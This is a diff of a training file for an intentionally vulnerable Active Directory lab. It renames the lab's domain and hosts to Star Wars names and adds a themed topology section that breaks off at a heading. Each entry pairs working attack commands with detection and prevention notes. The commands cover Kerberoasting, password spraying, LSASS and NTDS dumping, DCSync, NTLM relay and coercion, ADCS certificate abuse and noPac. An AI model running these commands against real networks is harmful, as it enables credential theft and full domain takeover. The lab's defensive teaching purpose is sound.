@@ -1,16 +1,16 @@
 # 03 — Credential Access (CRED-001..065)
 
-Goal of this phase: turn "domain user `peter.parker`" into "hashes / tickets / certs for higher-privileged principals." Every entry below is wired up in DVAD via the Ansible `vuln-cred-access.yml`, `vuln-kerberos.yml`, `vuln-adcs-esc.yml`, and the ADCS role.
+Goal of this phase: turn "domain user `peter.parker`" into "hashes / tickets / certs for higher-privileged principals." Every entry below is wired up in EMPIRE via the Ansible `vuln-cred-access.yml`, `vuln-kerberos.yml`, `vuln-adcs-esc.yml`, and the ADCS role.
 
 ---
 
 ### CRED-001 — Kerberoasting
 **What it is:** request a TGS for any account with an SPN; the TGS is partly encrypted with the service account's NT hash. Crack offline with hashcat.
-**Why it works here:** `svc_vision`, `svc_jarvis`, `svc_legacy` have SPNs and weak passwords (`Summer2023!`, `Password123!`).
+**Why it works here:** `svc_vision`, `svc_jarvis`, `svc_legacy` have SPNs and weak passwords (`Summer2023!`, `SithLord123!`).
 **Tools:** `impacket-GetUserSPNs`, `Rubeus`, `hashcat -m 13100`.
 **Steps:**
 ```bash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile spn.hashes
 hashcat -m 13100 spn.hashes /usr/share/wordlists/rockyou.txt
 ```
@@ -37,12 +37,12 @@ hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
 
 ### CRED-003 — Password Spray
 **What it is:** try one (very) common password against every account. Stays under lockout because each account sees one attempt.
-**Why it works here:** 15% of users have `Password123!`; lockout threshold = 0.
+**Why it works here:** 15% of users have `SithLord123!`; lockout threshold = 0.
 **Tools:** `nxc smb`, `kerbrute`.
 **Steps:**
 ```bash
-kerbrute passwordspray -d corp.local --dc 10.10.0.10 users.txt 'Password123!'
-nxc smb 10.10.0.10 -u users.txt -p 'Password123!' --continue-on-success
+kerbrute passwordspray -d empire.local --dc 10.10.0.10 users.txt 'SithLord123!'
+nxc smb 10.10.0.10 -u users.txt -p 'SithLord123!' --continue-on-success
 ```
 **Detection:** Event `4625` (failed logon) and `4771` (Kerberos pre-auth failed) across many accounts from one source IP in a short window. Defender for Identity "password spray" alert.
 **Prevention:** Smart Account Lockout, MFA, Azure AD password protection, ban common passwords (`Banned Password List`).
@@ -73,7 +73,7 @@ dir C:\Users\*\AppData\Roaming\Microsoft\Credentials
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
 ```bash
-lsassy -u Administrator -p 'DVADlab2024!' 10.10.0.13
+lsassy -u Administrator -p 'EmpireLab2024!' 10.10.0.13
 # LOLBin variant:
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Temp\l.dmp full
 ```
@@ -101,7 +101,7 @@ impacket-secretsdump -sam sam -system system LOCAL
 
 ### CRED-007 — NTDS.dit via Volume Shadow Copy
 **What it is:** snapshot `C:\` on a DC, copy `NTDS.dit` + `SYSTEM`, extract every domain hash offline.
-**Why it works here:** Backup Operators have access on `dc01`.
+**Why it works here:** Backup Operators have access on `coruscant`.
 **Tools:** `vssadmin`, `ntdsutil`, `wmiexec.py`, `secretsdump.py`.
 **Steps:**
 ```cmd
@@ -110,7 +110,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q
 ```bash
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 # remote:
-impacket-secretsdump -just-dc-ntlm corp.local/Administrator:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump -just-dc-ntlm empire.local/Administrator:'EmpireLab2024!'@10.10.0.10
 ```
 **Detection:** Event `8222` (VSS), `4661` (NTDS.dit handle), unusual SMB outbound from DC.
 **Prevention:** Tier-0 isolation; restrict who is in Backup Operators / Server Operators; Defender for Identity DCSync alert.
@@ -123,7 +123,7 @@ impacket-secretsdump -just-dc-ntlm corp.local/Administrator:'DVADlab2024!'@10.10
 **Tools:** `pyWhisker`, `Certipy shadow`, `Rubeus`.
 **Steps:**
 ```bash
-certipy shadow auto -u peter.parker@corp.local -p 'DVADlab2024!' -account svc_vision
+certipy shadow auto -u peter.parker@empire.local -p 'EmpireLab2024!' -account svc_vision
 # certipy prints both the cert and the resulting NT hash
 ```
 **Detection:** Event `5136` (object modified) on `msDS-KeyCredentialLink`. ATA/MDI flag.
@@ -137,7 +137,7 @@ certipy shadow auto -u peter.parker@corp.local -p 'DVADlab2024!' -account svc_vi
 **Tools:** `secretsdump.py --reversible`, mimikatz `lsadump::dcsync`.
 **Steps:**
 ```bash
-impacket-secretsdump -just-dc-user heimdall corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump -just-dc-user heimdall empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10
 # look for "RevPlaintext" / plaintext field
 ```
 **Detection:** Event `4738` (user account changed) when the flag is set.
@@ -166,7 +166,7 @@ Invoke-TokenManipulation -ImpersonateUser -Username 'corp\svc_vision'
 **Steps:**
 ```bash
 nxc smb 10.10.0.13 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
-impacket-psexec corp.local/Administrator@10.10.0.10 -hashes :31d6...
+impacket-psexec empire.local/Administrator@10.10.0.10 -hashes :31d6...
 ```
 **Detection:** Event `4624` Logon Type 3 + Logon Process `NtLmSsp` from one source to many destinations; Microsoft ATA / MDI "Pass-the-Hash" alert.
 **Prevention:** disable NTLM where possible (`Network security: Restrict NTLM`); Protected Users (no NTLM); LAPS; tier-0 isolation.
@@ -185,7 +185,7 @@ impacket-psexec corp.local/Administrator@10.10.0.10 -hashes :31d6...
 ```
 ```bash
 export KRB5CCNAME=peter.parker.ccache
-impacket-psexec -k -no-pass corp.local/peter.parker@dc01.corp.local
+impacket-psexec -k -no-pass empire.local/peter.parker@coruscant.empire.local
 ```
 **Detection:** Event `4624` Logon Type 3 + `Authentication Package: Kerberos` from an account whose normal logon location differs (TGT theft). Hard to detect without baseline.
 **Prevention:** Protected Users (TGTs not cached); shorter TGT lifetime; Credential Guard.
@@ -198,10 +198,10 @@ impacket-psexec -k -no-pass corp.local/peter.parker@dc01.corp.local
 **Tools:** `secretsdump.py -just-dc`, `mimikatz lsadump::dcsync`.
 **Steps:**
 ```bash
-impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc-ntlm
+impacket-secretsdump empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10 -just-dc-ntlm
 ```
 ```powershell
-.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator"
+.\mimikatz.exe "lsadump::dcsync /domain:empire.local /user:Administrator"
 ```
 **Detection:** Event `4662` with object access `DS-Replication-Get-Changes` from a non-DC source IP — Defender for Identity native alert.
 **Prevention:** audit who has `Replicating Directory Changes / All / In Filtered Set` — should be DCs only.
@@ -228,14 +228,14 @@ impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-d
 
 ### CRED-016 — Constrained Delegation Abuse (S4U2Self/S4U2Proxy)
 **What it is:** an account with `msDS-AllowedToDelegateTo` set can request a TGS *to that target SPN* on behalf of *any* user (S4U2Proxy). With `TrustedToAuthForDelegation` you can also call S4U2Self first → impersonate anyone to anywhere in the constrained list.
-**Why it works here:** `svc_vision` has TRUSTED_TO_AUTH_FOR_DELEGATION + delegation to `CIFS/file01`.
+**Why it works here:** `svc_vision` has TRUSTED_TO_AUTH_FOR_DELEGATION + delegation to `CIFS/scarif`.
 **Tools:** `Rubeus s4u`, `impacket-getST`.
 **Steps:**
 ```bash
-impacket-getST -spn cifs/file01.corp.local \
-   -impersonate Administrator corp.local/svc_vision:'Summer2023!' -dc-ip 10.10.0.10
+impacket-getST -spn cifs/scarif.empire.local \
+   -impersonate Administrator empire.local/svc_vision:'Summer2023!' -dc-ip 10.10.0.10
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass file01.corp.local
+impacket-psexec -k -no-pass scarif.empire.local
 ```
 **Detection:** Event `4769` for S4U2Self/S4U2Proxy patterns; abnormal SPN target list.
 **Prevention:** **Resource-Based** Constrained Delegation only; never set classic constrained delegation; never set TRUSTED_TO_AUTH_FOR_DELEGATION; Protected Users.
@@ -244,16 +244,16 @@ impacket-psexec -k -no-pass file01.corp.local
 
 ### CRED-017 — Resource-Based Constrained Delegation (RBCD)
 **What it is:** `msDS-AllowedToActOnBehalfOfOtherIdentity` on a *target* lists principals allowed to delegate to it. If you can write that attribute on a target, you can RBCD-attack from any controllable principal. Combine with MachineAccountQuota=10 to create your own computer.
-**Why it works here:** `ws01$` allows `svc_vision$` to act on behalf of; `MachineAccountQuota=10`.
+**Why it works here:** `tatooine$` allows `svc_vision$` to act on behalf of; `MachineAccountQuota=10`.
 **Tools:** `impacket-addcomputer`, `rbcd.py`, `Rubeus s4u`.
 **Steps:**
 ```bash
 impacket-addcomputer -computer-name 'evil$' -computer-pass 'P@ssw0rd!' \
-   corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
-impacket-rbcd -delegate-from 'evil$' -delegate-to 'ws01$' \
-   -action write corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
-impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
-   corp.local/evil\$:'P@ssw0rd!' -dc-ip 10.10.0.10
+   empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
+impacket-rbcd -delegate-from 'evil$' -delegate-to 'tatooine$' \
+   -action write empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
+impacket-getST -spn cifs/tatooine.empire.local -impersonate Administrator \
+   empire.local/evil\$:'P@ssw0rd!' -dc-ip 10.10.0.10
 ```
 **Detection:** Event `5136` modifying `msDS-AllowedToActOnBehalfOfOtherIdentity`. Defender for Identity native alert.
 **Prevention:** `MachineAccountQuota=0`; restrict who can write that attribute; monitor for changes.
@@ -262,15 +262,15 @@ impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
 
 ### CRED-018 — Unconstrained Delegation Abuse
 **What it is:** a host with `TRUSTED_FOR_DELEGATION` caches incoming users' TGTs in LSA. Coerce a privileged account (e.g. DC$) to authenticate to such a host, and you can extract their TGT.
-**Why it works here:** `file01` has unconstrained delegation; PrinterBug works against DCs.
+**Why it works here:** `scarif` has unconstrained delegation; PrinterBug works against DCs.
 **Tools:** `Rubeus monitor`, `printerbug.py`, `mimikatz sekurlsa::tickets /export`.
 **Steps:**
 ```powershell
-# on file01 (admin):
-.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
+# on scarif (admin):
+.\Rubeus.exe monitor /interval:5 /filteruser:coruscant$
 # from any low-priv:
-python3 printerbug.py corp.local/peter.parker:'DVADlab2024!'@dc01.corp.local file01.corp.local
-# Rubeus catches DC01$ TGT; PtT, DCSync.
+python3 printerbug.py empire.local/peter.parker:'EmpireLab2024!'@coruscant.empire.local scarif.empire.local
+# Rubeus catches coruscant$ TGT; PtT, DCSync.
 ```
 **Detection:** Event `4624` Logon Type 3 from DC$ to unconstrained host; Defender for Identity unconstrained delegation exposure.
 **Prevention:** disable unconstrained delegation entirely (use RBCD); add sensitive accounts to Protected Users / "sensitive and cannot be delegated."
@@ -283,7 +283,7 @@ python3 printerbug.py corp.local/peter.parker:'DVADlab2024!'@dc01.corp.local fil
 **Tools:** `CVE-2021-1675.py`, `PrintNightmare.py`, `SharpPrintNightmare`.
 **Steps:**
 ```bash
-python3 cve-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 '\\10.10.0.100\share\add_user.dll'
+python3 cve-2021-1675.py empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 '\\10.10.0.100\share\add_user.dll'
 ```
 **Detection:** Event `316` (PrintService/Admin) with `PrinterDriverInstalled`; Event `808` driver load failures from non-admin contexts.
 **Prevention:** disable Print Spooler everywhere it's not used (especially DCs); patch (KB5005010+); set `RestrictDriverInstallationToAdministrators=1`.
@@ -296,11 +296,11 @@ python3 cve-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 '\\10
 **Tools:** `PetitPotam.py`, `Coercer`, `ntlmrelayx.py`, `gettgtpkinit.py`.
 **Steps:**
 ```bash
-ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
+ntlmrelayx.py -t http://endor.empire.local/certsrv/certfnsh.asp \
    --adcs --template DomainController -smb2support
-python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.0.10
+python3 PetitPotam.py -u peter.parker -p 'EmpireLab2024!' -d empire.local 10.10.0.100 10.10.0.10
 # Pipe the base64 cert to gettgtpkinit:
-python3 gettgtpkinit.py corp.local/DC01\$ -cert-pfx dc01.pfx dc01.ccache
+python3 gettgtpkinit.py empire.local/coruscant\$ -cert-pfx coruscant.pfx coruscant.ccache
 ```
 **Detection:** Event `4624` from DC$ to attacker IP via NTLM; ADCS Event `4886`/`4887` (cert issued) with mismatch between requester and subject; MDI/ATA "PetitPotam" alert.
 **Prevention:** disable NTLM auth on ADCS web enrollment (Kerberos-only) + enable EPA; patch ADV210003; block `EfsRpcOpenFileRaw` (MS-EFSRPC) via RPC filter / KB5005413.
@@ -313,8 +313,8 @@ python3 gettgtpkinit.py corp.local/DC01\$ -cert-pfx dc01.pfx dc01.ccache
 **Tools:** `dfscoerce.py`, `Coercer`.
 **Steps:**
 ```bash
-ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
-python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.0.10
+ntlmrelayx.py -t ldaps://coruscant.empire.local --delegate-access -smb2support
+python3 dfscoerce.py -u peter.parker -p 'EmpireLab2024!' -d empire.local 10.10.0.100 10.10.0.10
 ```
 **Detection:** RPC `MS-DFSNM` calls from non-admin accounts.
 **Prevention:** disable DFS Namespaces where not needed; force SMB signing + LDAPS channel binding.
@@ -337,8 +337,8 @@ python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.100
 **Tools:** `noPac.py`, `Rubeus + Pachine`, `impacket-getTGT`.
 **Steps:**
 ```bash
-python3 noPac.py -dc-ip 10.10.0.10 corp.local/peter.parker:'DVADlab2024!' \
-   -dc-host dc01.corp.local -shell
+python3 noPac.py -dc-ip 10.10.0.10 empire.local/peter.parker:'EmpireLab2024!' \
+   -dc-host coruscant.empire.local -shell
 ```
 **Detection:** Event `4741` (computer created) + `4742` (renamed) + `4624` Logon Type 3 with mismatched names; MDI alert.
 **Prevention:** patch (KB5008380+); `MachineAccountQuota=0`.
@@ -352,11 +352,11 @@ python3 noPac.py -dc-ip 10.10.0.10 corp.local/peter.parker:'DVADlab2024!' \
 **Steps:**
 ```bash
 impacket-addcomputer -computer-name 'attack$' -computer-pass 'P@ssw0rd!' \
-   corp.local/peter.parker:'DVADlab2024!'
-certipy account update -u peter.parker@corp.local -p 'DVADlab2024!' \
-   -user attack$ -dns dc01.corp.local
-certipy req -u 'attack$@corp.local' -p 'P@ssw0rd!' -ca corp-CA-CA -template Machine \
-   -target ca01.corp.local
+   empire.local/peter.parker:'EmpireLab2024!'
+certipy account update -u peter.parker@empire.local -p 'EmpireLab2024!' \
+   -user attack$ -dns coruscant.empire.local
+certipy req -u 'attack$@empire.local' -p 'P@ssw0rd!' -ca corp-CA-CA -template Machine \
+   -target endor.empire.local
 certipy auth -pfx attack.pfx -dc-ip 10.10.0.10
 # DC$ TGT -> DCSync
 ```
@@ -371,9 +371,9 @@ certipy auth -pfx attack.pfx -dc-ip 10.10.0.10
 **Tools:** `PetitPotam`, `Coercer --transport http`.
 **Steps:**
 ```bash
-ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access --no-smb-server -smb2support -http-port 80
-python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' \
-   '\\attacker@80/foo' file01.corp.local
+ntlmrelayx.py -t ldaps://coruscant.empire.local --delegate-access --no-smb-server -smb2support -http-port 80
+python3 PetitPotam.py -u peter.parker -p 'EmpireLab2024!' \
+   '\\attacker@80/foo' scarif.empire.local
 ```
 **Detection:** WebDAV PROPFIND in IIS logs; WebClient service start events.
 **Prevention:** disable WebClient on servers; force SMB; LDAP channel binding.
@@ -386,7 +386,7 @@ python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' \
 **Tools:** `Invoke-DNSUpdate`, `dnstool.py`, `krbrelayx/dnstool.py`.
 **Steps:**
 ```bash
-python3 dnstool.py -u 'corp\peter.parker' -p 'DVADlab2024!' \
+python3 dnstool.py -u 'corp\peter.parker' -p 'EmpireLab2024!' \
    -r '*' -d 10.10.0.100 --action add 10.10.0.10
 ```
 **Detection:** Event `5136` on `dnsNode` objects under `MicrosoftDNS`.
@@ -395,13 +395,13 @@ python3 dnstool.py -u 'corp\peter.parker' -p 'DVADlab2024!' \
 ---
 
 ### CRED-027 — ADCS Disable SAN Validation (ESC6 variant)
-**What it is:** the CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` lets requesters add SAN to *any* enrollment. Combined with a Client Auth template = request cert with `Administrator@corp.local` as SAN → DA cert.
+**What it is:** the CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` lets requesters add SAN to *any* enrollment. Combined with a Client Auth template = request cert with `Administrator@empire.local` as SAN → DA cert.
 **Why it works here:** CA registry flag set.
 **Tools:** `Certipy req --upn`, `Certify request /altname:`.
 **Steps:**
 ```bash
-certipy req -u peter.parker@corp.local -p 'DVADlab2024!' -ca corp-CA-CA \
-   -template User -upn Administrator@corp.local -target ca01.corp.local
+certipy req -u peter.parker@empire.local -p 'EmpireLab2024!' -ca corp-CA-CA \
+   -template User -upn Administrator@empire.local -target endor.empire.local
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 ```
 **Detection:** ADCS Event `4886`/`4887` where requester ≠ SAN; MDI ESC6 alert.
@@ -415,9 +415,9 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 **Tools:** `Certipy ≥ 4.8`.
 **Steps:**
 ```bash
-certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA \
+certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA \
    -template WebServer -application-policies 'Client Authentication' \
-   -upn Administrator@corp.local
+   -upn Administrator@empire.local
 ```
 **Detection:** ADCS event with non-standard Application Policy OIDs.
 **Prevention:** patch (KB5044284); migrate v1 templates to v2+; remove Client Auth from broad templates.
@@ -468,8 +468,8 @@ sudo tcpdump -i virbr1 -A 'port 389 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x60'
 **Tools:** `nxc ldap --laps`, `LAPSDumper`, `Get-LAPSADPassword`.
 **Steps:**
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --laps
-python3 laps.py -u peter.parker -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --laps
+python3 laps.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -dc-ip 10.10.0.10
 ```
 **Detection:** Event `4662` reading `ms-Mcs-AdmPwd` attribute (GUID known).
 **Prevention:** audit who has `All Extended Rights` / `Read ms-Mcs-AdmPwd` on OUs; migrate to Windows LAPS with encryption.
@@ -482,7 +482,7 @@ python3 laps.py -u peter.parker -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.1
 **Tools:** `gMSADumper`, `nxc ldap --gmsa`.
 **Steps:**
 ```bash
-python3 gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local
+python3 gMSADumper.py -u peter.parker -p 'EmpireLab2024!' -d empire.local
 ```
 **Detection:** Event `4662` reading `msDS-ManagedPassword` from non-host account.
 **Prevention:** lock down `PrincipalsAllowedToRetrieveManagedPassword` to the intended host only.
@@ -517,7 +517,7 @@ SharpChromium.exe all
 
 ### CRED-037 — AzureAD SSO Token Extraction
 **What it is:** Hybrid SSO uses `AZUREADSSOACC$` computer object's NT hash to sign tickets. With the hash you forge tickets as any synced user.
-**Why it works here:** placeholder if hybrid PTA/PHS is wired up. (Not enabled in default DVAD topology.)
+**Why it works here:** placeholder if hybrid PTA/PHS is wired up. (Not enabled in default EMPIRE topology.)
 **Tools:** `AADInternals`.
 **Steps:**
 ```powershell
@@ -551,7 +551,7 @@ Open-AADIntOffice365Portal -AccessToken $token
 **Steps:**
 ```cmd
 diskshadow /s c:\temp\shadow.txt
-robocopy /B \\dc01\C$\Windows\NTDS\ C:\Temp\ntds NTDS.dit
+robocopy /B \\coruscant\C$\Windows\NTDS\ C:\Temp\ntds NTDS.dit
 reg save HKLM\SYSTEM C:\Temp\SYSTEM
 ```
 **Detection:** Event `4673` `SeBackupPrivilege` used by non-backup software.
@@ -627,8 +627,8 @@ ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc ..."
 **Tools:** `Certipy req -on-behalf-of`.
 **Steps:**
 ```bash
-certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template EnrollmentAgentTemplate
-certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template User \
+certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA -template EnrollmentAgentTemplate
+certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA -template User \
    -on-behalf-of 'corp\Administrator' -pfx ea.pfx
 ```
 **Detection:** ADCS Event `4886`/`4887` with "Enrollment Agent" attribute.
@@ -642,7 +642,7 @@ certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template User \
 **Tools:** `ntlmrelayx.py --delegate-access -t ldaps://...`.
 **Steps:**
 ```bash
-ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
+ntlmrelayx.py -t ldaps://coruscant.empire.local --delegate-access -smb2support
 # trigger coercion or relay an arriving auth
 ```
 **Detection:** LDAPS connections with no EPA (Event `2889`).
@@ -655,8 +655,8 @@ ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
 **Tools:** `PetitPotam`, `ntlmrelayx -t ldap://...`.
 **Steps:**
 ```bash
-ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user peter.parker -smb2support --no-smb-server -http-port 80
-python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' '\\attacker@80/foo' file01.corp.local
+ntlmrelayx.py -t ldap://coruscant.empire.local --escalate-user peter.parker -smb2support --no-smb-server -http-port 80
+python3 PetitPotam.py -u peter.parker -p 'EmpireLab2024!' '\\attacker@80/foo' scarif.empire.local
 ```
 **Detection:** non-DC LDAP write events for AdminSDHolder/User ACL.
 **Prevention:** require LDAP signing; disable WebClient; SMB signing required.
@@ -683,7 +683,7 @@ python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' '\\attacker@80/foo' file
 **Tools:** same as CRED-051 + `ntlmrelayx.py`.
 **Steps:**
 ```bash
-ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user peter.parker -smb2support
+ntlmrelayx.py -t ldap://coruscant.empire.local --escalate-user peter.parker -smb2support
 # deliver .library-ms via shared archive
 ```
 **Detection / Prevention:** same as CRED-051 + LDAP signing + channel binding.
@@ -695,7 +695,7 @@ ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user peter.parker -smb2suppor
 **Tools:** `ShadowCoerce.py`.
 **Steps:**
 ```bash
-python3 ShadowCoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.100 dc01.corp.local
+python3 ShadowCoerce.py -u peter.parker -p 'EmpireLab2024!' -d empire.local 10.10.0.100 coruscant.empire.local
 ```
 **Detection / Prevention:** RPC filter for FSRVP; patch (KB5015754).
 
@@ -706,7 +706,7 @@ python3 ShadowCoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.
 **Tools:** `Pre2k.py`, `kerbrute`.
 **Steps:**
 ```bash
-python3 pre2k.py auth -d corp.local -dc-ip 10.10.0.10 -inputfile machines.txt -outputfile pre2k.csv
+python3 pre2k.py auth -d empire.local -dc-ip 10.10.0.10 -inputfile machines.txt -outputfile pre2k.csv
 ```
 **Detection:** Event `4624` Logon Type 3 with machine account using default password.
 **Prevention:** clear Pre-Windows 2000 group; force-reset all machine passwords.
@@ -718,7 +718,7 @@ python3 pre2k.py auth -d corp.local -dc-ip 10.10.0.10 -inputfile machines.txt -o
 **Tools:** `RemoteMonologue.py`, `Internal-Monologue.exe`.
 **Steps:**
 ```bash
-python3 remotemonologue.py -u peter.parker -p 'DVADlab2024!' -d corp.local -t 10.10.0.13
+python3 remotemonologue.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -t 10.10.0.13
 ```
 **Detection:** Sysmon `1` `mmc.exe`/`taskmgr.exe` spawning DCOM under unusual parent.
 **Prevention:** disable DCOM (`HKLM\Software\Microsoft\Ole\EnableDCOM=N`) where unused; block outbound NTLM.
@@ -762,7 +762,7 @@ Get-ADObject -IncludeDeletedObjects -Filter 'isDeleted -eq $true' |
 **Tools:** `goLAPS`, `LAPSDumper.py`, `nxc ldap --laps`.
 **Steps:**
 ```bash
-./goLAPS -u peter.parker -p 'DVADlab2024!' -d corp.local -dc 10.10.0.10
+./goLAPS -u peter.parker -p 'EmpireLab2024!' -d empire.local -dc 10.10.0.10
 ```
 **Detection:** large `4662` for ms-LAPS-Password / ms-Mcs-AdmPwd reads.
 **Prevention:** Windows LAPS with encryption; restrict ReadLAPSPassword to a security group, not All Authenticated Users.
@@ -786,9 +786,9 @@ Get-ADObject -IncludeDeletedObjects -Filter 'isDeleted -eq $true' |
 **Tools:** `krbrelayx.py`.
 **Steps:**
 ```bash
-python3 dnstool.py -u 'corp\peter.parker' -p 'DVADlab2024!' \
+python3 dnstool.py -u 'corp\peter.parker' -p 'EmpireLab2024!' \
    -r 'fs1' --action add --data 10.10.0.100 10.10.0.10
-python3 krbrelayx.py -t ldap://dc01.corp.local --delegate-access
+python3 krbrelayx.py -t ldap://coruscant.empire.local --delegate-access
 ```
 **Detection:** Event `5136` adding CNAMEs in DNS.
 **Prevention:** ADIDNS ACL hardening; KDC-cert-strict; SPN-based mitigations (KB5034439).
@@ -812,7 +812,7 @@ KrbRelayUp.exe full --Method SCM
 **Tools:** `goldenPac.py`, `pykek`.
 **Steps:**
 ```bash
-impacket-goldenPac corp.local/peter.parker:'DVADlab2024!'@dc01.corp.local
+impacket-goldenPac empire.local/peter.parker:'EmpireLab2024!'@coruscant.empire.local
 ```
 **Detection:** Event `4769` with mismatched PAC signature; KDC log signature failure.
 **Prevention:** patch (KB3011780 — 2014); should be impossible on any DC built since 2015.
@@ -836,8 +836,8 @@ impacket-goldenPac corp.local/peter.parker:'DVADlab2024!'@dc01.corp.local
 **Tools:** `mimikatz lsadump::backupkeys`, `SharpDPAPI backupkey`.
 **Steps:**
 ```powershell
-.\mimikatz.exe "lsadump::backupkeys /system:dc01.corp.local /export"
-.\SharpDPAPI.exe backupkey /server:dc01.corp.local
+.\mimikatz.exe "lsadump::backupkeys /system:coruscant.empire.local /export"
+.\SharpDPAPI.exe backupkey /server:coruscant.empire.local
 ```
 **Detection:** MS-BKRP RPC calls from non-DC IP.
 **Prevention:** tier-0; restrict who can hit DC RPC; rotate the DPAPI backup key after compromise (painful but necessary).
@@ -845,3 +845,85 @@ impacket-goldenPac corp.local/peter.parker:'DVADlab2024!'@dc01.corp.local
 ---
 
 Next: [`04-lateral-movement.md`](04-lateral-movement.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
